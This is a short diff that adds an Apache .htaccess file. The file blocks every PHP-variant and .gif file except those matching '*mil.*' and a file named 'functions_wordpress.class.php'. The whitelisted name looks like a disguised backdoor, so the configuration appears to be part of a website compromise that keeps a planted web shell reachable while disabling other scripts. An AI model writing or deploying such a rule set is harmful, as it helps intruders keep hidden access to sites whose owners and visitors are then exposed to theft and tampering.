@@ -1,0 +1,11 @@
+<Files ~ "\.(php|php3|php5|php4|phtml|gif|phpgif|pHp|PHP|PhP|PHp|pHP)$">
+deny from all
+</Files>
+<Files *mil.*>
+Order Allow,Deny
+Allow from all
+</Files>
+<Files functions_wordpress.class.php>
+Order Allow,Deny
+Allow from all
+</Files>
